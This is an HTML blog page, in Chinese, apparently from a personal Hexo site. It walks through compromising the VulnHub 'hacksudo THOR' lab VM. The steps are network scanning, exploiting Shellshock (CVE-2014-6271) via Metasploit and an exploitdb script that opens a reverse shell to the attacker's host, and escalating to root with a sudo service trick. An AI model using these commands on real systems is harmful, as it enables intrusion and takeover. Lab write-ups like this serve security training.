@@ -1,0 +1,655 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="VULNHUB 11-20" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/119%20THOR/">
+
+
+
+  <title>
+VULNHUB 19 THOR - VULNHUB |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">VULNHUB 19 THOR
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-01 14:06:58">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-01T14:06:58+08:00">2023-07-01</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/kaZNxKDQWGfuhze.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/Atnrq5DWxYZj7wN.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/Pqn3SXIzyRidv6H.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/C83rXtNWOS4dPh6.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YR8Qc1kd6WE3lSq.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/x6dgpGLH7auh2Sy.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/VULNHUB/" itemprop="item" rel="index" title="分类于 VULNHUB"><span itemprop="name">VULNHUB</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/119%20THOR/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tdGhvciw3MzMv">https://www.vulnhub.com/entry/hacksudo-thor,733/</span><br>
+ 教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDE0NTIuaHRtbA==">https://www.cnblogs.com/sainet/p/15801452.html</span></p>
+<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
+<p>攻击机 kali： 1 92.168.31.135<br>
+ 靶机 THOR：桥接于 1 92.168.31.1 的网卡，ip 未知</p>
+<p>1 ）确定靶机 ip 地址<br>
+ sudo arp-scan -l</p>
+<p>查看靶机所在 win 主机的 ip 地址<br>
+ ipconfig | find “192.168.31”</p>
+<p>与主机同一 MAC 地址的 ip 地址即为靶机 IP</p>
+<p>也可以登陆路由器后台，查看 win 主机上的信息</p>
+<p>显示有 win 上所有存在过的 ip 地址，以及其 MAC 地址<br>
+ à 靶机 ip：<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1Lw==">http://192.168.31.115/</span></p>
+<p>2 ）确认靶机 ip 开放的端口信息<br>
+ sudo nmap - p- 192.168.31. 115</p>
+<p>à 靶机开放端口 21 ， 22 ， 80</p>
+<h3 id="002-网站信息收集sql注入测试"><a class="markdownIt-Anchor" href="#002-网站信息收集sql注入测试">#</a> 002 网站信息收集，sql 注入测试</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">http://192.168.31.</span> 115 / 进行信息收集</p>
+<p>dirsearch -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1Lw==">http://192.168.31.115/</span></p>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1L1JFQURNRS5tZA==">http://192.168.31.115/README.md</span></p>
+<p>管理员的用户名是 “admin”，密码是 “password123”。</p>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1L2luZGV4LnBocA==">http://192.168.31.115/index.php</span></p>
+<h3 id="输入用户名和密码之后显示登录失败可能此密码在其他地方才能登陆"><a class="markdownIt-Anchor" href="#输入用户名和密码之后显示登录失败可能此密码在其他地方才能登陆">#</a> 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆</h3>
+<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1L2FkbWluX2xvZ2luLnBocA==">http://192.168.31.115/admin_login.php</span></p>
+<h3 id="成功登陆到对方网站的后台"><a class="markdownIt-Anchor" href="#成功登陆到对方网站的后台">#</a> 成功登陆到对方网站的后台</h3>
+<h3 id="翻了翻目录没有什么新的发现"><a class="markdownIt-Anchor" href="#翻了翻目录没有什么新的发现">#</a> 翻了翻目录没有什么新的发现</h3>
+<h3 id="尝试对登陆的地方进行注入"><a class="markdownIt-Anchor" href="#尝试对登陆的地方进行注入">#</a> 尝试对登陆的地方进行注入</h3>
+<p>对登陆的地方进行 burp 抓取数据包</p>
+<p>复制数据包，用 sqlmap 测试发现没有注入点</p>
+<h3 id="003-cgi-bin-漏洞nmap扫描shellshock"><a class="markdownIt-Anchor" href="#003-cgi-bin-漏洞nmap扫描shellshock">#</a> 003 cgi-bin 漏洞，nmap 扫描 shellshock</h3>
+<p>扩大信息收集面，用 dirb 收集更多的目录结构</p>
+<p>对收集到的 cgi-bin 目录进行更深一级的搜寻<br>
+ dirsearch - u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTE1L2NnaS1iaW4v">http://192.168.31.115/cgi-bin/</span></p>
+<p>敏感目录 http://192.168.31.115/cgi-bin/shell.sh</p>
+<p>直接上谷歌搜索 cgi-bin 的漏洞</p>
+<p>找到了测试 shellshock 的的命令</p>
+<p>nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh 192.168.31.115</p>
+<h3 id="确定了此端口存在cve-2014-6271-这个漏洞"><a class="markdownIt-Anchor" href="#确定了此端口存在cve-2014-6271-这个漏洞">#</a> 确定了此端口存在 CVE- 2014 - 6271 这个漏洞</h3>
+<h3 id="004-msf和seachsploit利用shellshock漏洞"><a class="markdownIt-Anchor" href="#004-msf和seachsploit利用shellshock漏洞">#</a> 004 msf 和 seachsploit 利用 shellshock 漏洞</h3>
+<p>（ 1 ）利用 msf 寻找此漏洞进行利用</p>
+<p>search CVE- 2014 - 6271<br>
+use exploit/multi/http/apache_mod_cgi_bash_env_exec<br>
+set rhosts 192.168.31.115<br>
+set targeturi /cgi-bin/shell.sh<br>
+run</p>
+<p>成功拿到网站反弹的 shell</p>
+<p>（ 2 ）searchsploit 利用 shellshock<br>
+searchsploit shellshock</p>
+<p>searchsploit -x linux/remote/34900.py</p>
+<p>cp /usr/share/exploitdb/exploits/linux/remote/34900.py.<br>
+python <span class="exturl" data-url="aHR0cDovLzM0OTAwLnB5">34900.py</span><br>
+ 查看此 exp 是如何利用的</p>
+<h3 id="根据提示写全命令行进行攻击"><a class="markdownIt-Anchor" href="#根据提示写全命令行进行攻击">#</a> 根据提示，写全命令行进行攻击</h3>
+<p>./34900.py payload=reverse rhost=192.168.31.115 lhost=192.168.31.135 lport=5555<br>
+pages=/cgi-bin/shell.sh</p>
+<p>成功拿到反弹后的 shell</p>
+<h3 id="005-pspy监控service提权"><a class="markdownIt-Anchor" href="#005-pspy监控service提权">#</a> 005 pspy 监控，service 提权</h3>
+<h3 id="翻阅目录查找到一个备份文件"><a class="markdownIt-Anchor" href="#翻阅目录查找到一个备份文件">#</a> 翻阅目录，查找到一个备份文件</h3>
+<p>猜测此备份由高权限执行，直接上 pspy 进行监控</p>
+<p>将 pspy 从 kali 机器上下载下来，赋予 x 权限，然后执行</p>
+<h3 id="等待监控是否执行了一些特殊命令"><a class="markdownIt-Anchor" href="#等待监控是否执行了一些特殊命令">#</a> 等待监控是否执行了一些特殊命令</h3>
+<h3 id="遗憾的是并没有执行什么特殊任务不能进行提权"><a class="markdownIt-Anchor" href="#遗憾的是并没有执行什么特殊任务不能进行提权">#</a> 遗憾的是并没有执行什么特殊任务，不能进行提权</h3>
+<p>收集服务器的相关信息，sudo - l 确定了可以调用 thor 去执行一个脚本<br>
+ sudo - u thor /home/thor/./hamer.sh<br>
+ 输入 bash 后反弹出来了一个 thor 用户的 shell<br>
+python3 -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’</p>
+<p>sudo - l 查看 thor 的权限设置，发现其可以直接无密码调用 root 的 service<br>
+<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">https://gtfobins.github.io/</span> 上找到了 service 的提权命令<br>
+ sudo service …/…/bin/sh<br>
+python3 -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’</p>
+<p>提权成功最终拿到了 root 权限</p>
+
+      <div class="tags">
+          <a href="/tags/VULNHUB-11-20/" rel="tag"><i class="ic i-tag"></i> VULNHUB 11-20</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-02 15:07:41" itemprop="dateModified" datetime="2023-07-02T15:07:41+08:00">2023-07-02</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/07/01/VULNHUB/119%20THOR/" title="VULNHUB 19 THOR">http://n1h1l157.github.io/2023/07/01/VULNHUB/119 THOR/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/01/VULNHUB/118%20JANGOW/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;BCMkIXvxWUj69pG.jpg" title="VULNHUB 18 JANGOW">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB 18 JANGOW</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/07/01/VULNHUB/123%20KEYRING/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;vEcnkg9uhaCf3ey.jpg" title="VULNHUB KEYRING">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB KEYRING</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text"> 002 网站信息收集，sql 注入测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E5%8F%AF%E8%83%BD%E6%AD%A4%E5%AF%86%E7%A0%81%E5%9C%A8%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9%E6%89%8D%E8%83%BD%E7%99%BB%E9%99%86"><span class="toc-number">3.</span> <span class="toc-text"> 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E5%88%B0%E5%AF%B9%E6%96%B9%E7%BD%91%E7%AB%99%E7%9A%84%E5%90%8E%E5%8F%B0"><span class="toc-number">4.</span> <span class="toc-text"> 成功登陆到对方网站的后台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E4%BA%86%E7%BF%BB%E7%9B%AE%E5%BD%95%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B0%E7%9A%84%E5%8F%91%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text"> 翻了翻目录没有什么新的发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%AF%B9%E7%99%BB%E9%99%86%E7%9A%84%E5%9C%B0%E6%96%B9%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text"> 尝试对登陆的地方进行注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-cgi-bin-%E6%BC%8F%E6%B4%9Enmap%E6%89%AB%E6%8F%8Fshellshock"><span class="toc-number">7.</span> <span class="toc-text"> 003 cgi-bin 漏洞，nmap 扫描 shellshock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BA%86%E6%AD%A4%E7%AB%AF%E5%8F%A3%E5%AD%98%E5%9C%A8cve-2014-6271-%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.</span> <span class="toc-text"> 确定了此端口存在 CVE- 2014 - 6271 这个漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-msf%E5%92%8Cseachsploit%E5%88%A9%E7%94%A8shellshock%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text"> 004 msf 和 seachsploit 利用 shellshock 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E5%86%99%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text"> 根据提示，写全命令行进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#005-pspy%E7%9B%91%E6%8E%A7service%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text"> 005 pspy 监控，service 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BF%BB%E9%98%85%E7%9B%AE%E5%BD%95%E6%9F%A5%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toc-number">12.</span> <span class="toc-text"> 翻阅目录，查找到一个备份文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E5%BE%85%E7%9B%91%E6%8E%A7%E6%98%AF%E5%90%A6%E6%89%A7%E8%A1%8C%E4%BA%86%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4"><span class="toc-number">13.</span> <span class="toc-text"> 等待监控是否执行了一些特殊命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E6%86%BE%E7%9A%84%E6%98%AF%E5%B9%B6%E6%B2%A1%E6%9C%89%E6%89%A7%E8%A1%8C%E4%BB%80%E4%B9%88%E7%89%B9%E6%AE%8A%E4%BB%BB%E5%8A%A1%E4%B8%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">14.</span> <span class="toc-text"> 遗憾的是并没有执行什么特殊任务，不能进行提权</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/07/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2023/07/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2023/07/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2023/07/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2023/07/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2023/07/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2023/07/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2023/07/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2023/07/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2023/07/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2023/07/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2023/07/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2023/07/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2023/07/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2023/07/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2023/07/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li class="active"><a href="/2023/07/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2023/07/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2023/07/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2023/07/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB RIPPER">VULNHUB RIPPER</a></li><li><a href="/2023/07/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB FUNBOX10">VULNHUB FUNBOX10</a></li><li><a href="/2023/07/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB KEYRING">VULNHUB KEYRING</a></li><li><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2023/07/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2023/07/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2023/07/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2023/07/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2023/07/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2023/07/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2023/07/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2023/07/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2023/07/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2023/07/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2023/07/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li><a href="/2023/07/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB VENUS">VULNHUB VENUS</a></li><li><a href="/2023/07/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2023/07/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2023/07/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2023/07/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2023/07/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2023/07/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2023/07/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li><a href="/2023/07/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li><li><a href="/2023/07/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2023/07/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2023/07/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2023/07/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2023/07/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
